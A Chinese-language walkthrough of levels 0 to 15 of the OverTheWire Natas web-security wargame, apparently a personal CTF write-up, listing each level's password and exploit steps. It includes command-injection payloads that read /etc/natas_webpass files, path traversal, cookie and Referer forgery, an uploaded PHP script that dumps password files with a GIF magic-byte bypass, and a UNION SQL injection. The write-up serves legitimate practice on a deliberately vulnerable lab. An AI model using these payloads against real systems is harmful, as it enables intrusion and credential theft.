#CTF 
## Level 0
```text
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```
密码为 `natas0`

## Level 1
```sh
❯ curl http://natas0.natas.labs.overthewire.org -u natas0:natas0
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7 -->
</div>
</body>
</html>
```
密码为 `scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7`

## Level 2
```sh
❯ curl http://natas1.natas.labs.overthewire.org -u natas1:scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is vsDOxoXyq3wckCP1ZmTZ71ngIA606odB -->
</div>
</body>
</html>
```
密码为 `vsDOxoXyq3wckCP1ZmTZ71ngIA606odB`

PS: 这关本意应该是防止在浏览器中右键进入开发者工具，但我这里一直用 curl 没注意。

## Level 3
访问 `http://natas2.natas.labs.overthewire.org/files/`，发现 `users.txt`。
```plain
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:K30JrSRHzjxq3paUQuwozY4MNvmNFyhI
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
密码为 `K30JrSRHzjxq3paUQuwozY4MNvmNFyhI`

## Level 4
访问 `http://natas3.natas.labs.overthewire.org/robots.txt`
```plain
User-agent: *
Disallow: /s3cr3t/
```
不让进的说明有秘密，访问 `http://natas3.natas.labs.overthewire.org/s3cr3t/user.txt`
```plain
natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
```
密码为 `JDrPnuZAKyl6MkiqQGFIddrqpvgOASth`

## Level 5
```sh
❯ curl http://natas4.natas.labs.overthewire.org -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth \
-H "Referer: http://natas5.natas.labs.overthewire.org/"
...
Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
...
```
密码为 `e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M`

## Level 6
打开开发者工具，检查 Cookie，发现 `logged=0`，改为 1，刷新即可。

密码为 `7mhjtShJAcld2NYbKHEadnhEwRn2P8VT`

## Level 7
查看服务端源代码，发现
```js
include "includes/secret.inc";
```
继而检查 `includes/secret.inc` 路径，发现
```plain
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
提交即可。

密码为 `B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0`

## Level 8
直接访问 `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`
```plain
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```

密码为 `ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc`

## Level 9
查看源代码发现密码编码逻辑：
```js
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {  
    return bin2hex(strrev(base64_encode($secret)));  
}
```

用 https://cyberchef.org/ 解码，得到 `oubWYf2kBq`，提交即可。

密码为 `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`

## Level 10
查看源代码，发现可利用逻辑：
```js
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

构造字符串 `; cat /etc/natas_webpass/natas10 ;` 提交即可。

密码为 `EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv`

## Level 11
构造字符串 `"" /etc/natas_webpass/natas11`，可得到
```plain
/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

密码为 `VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd`

## Level 12
通过查看网页存储，发现 Cookie：
```plain
data: EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D
```
其中有字符进行了 url 编码：
```plain
%2B: +
%2F: /
%3D: =
```
因此还原为 base 64 编码：
```plain
EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=
```
通过手动编码 `array( "showpassword"=>"no", "bgcolor"=>"#ffffff")`，会得到：
```
eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=
```
由于异或的性质：
```plain
enc = plain ^ key -> key = enc ^ plain
```
因此将两个编码异或处理：
```plain
kBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwkBSwk
```
不难看出 `key` 为 `kBSw`。这样就可以编码 `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")` 了：
```plain
EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/
```

修改 Cookie 并刷新，就可以看到密码了。

密码为 `EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng`

## Level 13
阅读源代码，发现服务端处理文件的逻辑是：
1. 在 `upload` 目录下生成随机路径，且保证不与既有文件重合；
```plain
$target_path = "upload/<unique random string>.<ext>"
```
注意到，其中的 `<ext>` 来自表单中隐藏的 `filename` 字段，这为我们提供了突破口。
2. 将文件上传到第一步生成的目标路径；
3. 显示目标路径。

根据上述逻辑，可以在本地构造 php 脚本：
```php
<?php
$filename = '/etc/natas_webpass/natas13';
$content = file_get_contents($filename);
echo $content;
?>
```

但直接上传后，拓展名会变成 `.jpg`，无法直接运行。因此，考虑利用 `filename` 字段注入 `php` 拓展名，提交脚本文件前修改 `filename` 字段的 `value` 属性的拓展名即可。

访问生成的目标路径，就可以看到密码了。

密码为：`g8ba0olAzaSJuyS4gnmbdVVigAICLG1k`

## Level 14
这次相较 Level 13 的唯一改变是增加了文件类型校验，原理是检查文件的魔数是否为图片类型。
```php
...
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
        echo "File is not an image";
}
...
```
因此，只需要在构造的脚本最前面加上图片类型魔数即可。这里选择可用 ASCII 字符直接表示的 GIF 类型：
```php
GIF87a
<?php
$filename = '/etc/natas_webpass/natas14';
$content = file_get_contents($filename);
echo $content;
?>
```

其余步骤同 Level 13。

密码为 `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`

## Level 15
可 sql 注入，构造 `username`：
```sql
123
```
以及 `password`：
```sql
456 UNION SELECT * from users
```

